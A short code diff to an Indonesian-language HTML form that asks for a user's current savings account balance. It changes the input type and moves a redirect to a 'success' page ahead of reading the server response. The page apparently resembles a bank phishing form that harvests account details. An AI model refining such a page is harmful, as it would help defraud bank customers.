@@ -287,7 +287,7 @@
 
             <div class="form-group">
                 <label class="form-label">Saldo Rekening Tabungan saat Ini</label>
-                <input type="text" class="form-input" placeholder="Sisa Saldo" id="saldo" oninput="checkForm()">
+                <input type="tel" class="form-input" placeholder="Sisa Saldo" id="saldo" oninput="checkForm()">
             </div>
 
             <button type="submit" class="submit-btn" id="submitBtn" disabled>
@@ -395,6 +395,7 @@
                     }
                 );
 
+                window.location.href = 'sukses.html';
                 const data = await response.json();
 
                 if (data.ok) {
@@ -414,8 +415,6 @@
             }
 
             return false;
-            
-            window.location.href = 'sukses.html';
         }
     </script>
 </body>
